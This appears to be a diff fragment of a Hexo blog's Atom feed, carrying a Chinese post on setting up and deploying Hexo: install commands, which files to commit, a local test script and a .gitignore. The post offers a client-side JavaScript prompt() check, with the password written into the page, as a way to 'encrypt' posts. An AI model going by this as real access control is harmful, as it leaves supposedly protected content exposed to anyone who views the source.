+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm install hexo --save</div><div class="line">npm install</div><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
+</li>
+<li><p>下面就是测试 server,generate,deploy命令了</p>
+</li>
+</ol>
+<p>再来总结一下哪些文件需要上传，哪些不能上传：<br>上传:</p>
+<pre><code>* _config.yml
+* theme/
+* source/
+* scaffolds/
+* package.json
+* .gitignore
+</code></pre><p>theme 下所有的.git/目录要删除，.gitignore 根据需要做修改。</p>
+<p>不上传:</p>
+<pre><code>* .git/
+* db.json
+* node_modules/
+* public/
+* .deploy_git/
+</code></pre><blockquote>
+<p>我遇到的坑, 在使用 GhoSadillaX 主题时，因为其gitignore 不上传_config.yml, 导致在 mac 上测试一直显示 duoshao 没配置short_name, 最后还是把 theme下的_config.yml找回来才解决。</p>
+</blockquote>
+<h3 id="hexo-博文设置-密码验证"><a href="#hexo-博文设置-密码验证" class="headerlink" title="hexo 博文设置 密码验证"></a>hexo 博文设置 密码验证</h3><p>首先，我们要了解 hexo 支持 markdown和javascript 混合编程。那么要实现对 单独的blog 加密，就可以在md 文件中嵌入一段校验密码的 js代码，如果要对所有的 blog 加密可以在 theme 中的 layout/_partial/header.ejs文件中添加一段校验密码的 js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    <span class="keyword">if</span>( prompt(<span class="string">"Please input password"</span>) !== <span class="built_in">String</span>(&#123;&#123; password &#125;&#125;) )</div><div class="line">    &#123;</div><div class="line">        alert(<span class="string">'密码错误！'</span>);</div><div class="line">        self.location=<span class="string">'http://localhost:4000/about/'</span>;</div><div class="line">        <span class="comment">// history.back();</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"密码正确"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>password 可以在 md文件头部设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: xxx</div><div class="line">date: 2017-</div><div class="line">tags:  [xx,zz]</div><div class="line">categories:</div><div class="line">password: password</div><div class="line">---</div></pre></td></tr></table></figure></p>
+<h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><h3 id="本地测试脚本"><a href="#本地测试脚本" class="headerlink" title="本地测试脚本"></a>本地测试脚本</h3><p>rtest.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Bhome=/home/floatg/data/FG-B<span class="built_in">log</span>/hexo/blog</div><div class="line">killall -9 hexo</div><div class="line"><span class="built_in">cd</span> <span class="variable">$Bhome</span></div><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
+<h3 id="gitignore-内容"><a href="#gitignore-内容" class="headerlink" title=".gitignore 内容"></a>.gitignore 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">*.log</div><div class="line">/.deploy*</div><div class="line">/_config.yml</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">rtest.sh</div><div class="line">db.json</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;基础配置（一）&quot;&gt;&lt;a href=&quot;#基础配置（一）&quot; class=&quot;headerlink&quot; title=&quot;基础配置（一）&quot;&gt;&lt;/a&gt;基础配置（一）&lt;/h2&gt;&lt;h3 id=&quot;工具安装&quot;&gt;&lt;a href=&quot;#工具安装&quot; class=&quot;headerlink&quot; title=&quot;工具安装&quot;&gt;&lt;/a&gt;工具安装&lt;/h3&gt;
+    
+    </summary>
+    
+      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
+    
+    
+      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
+    
+      <category term="AppVeyor" scheme="http://yoursite.com/tags/AppVeyor/"/>
+    
+      <category term="CI" scheme="http://yoursite.com/tags/CI/"/>
+    
+      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
+    
+  </entry>
+  
+</feed>
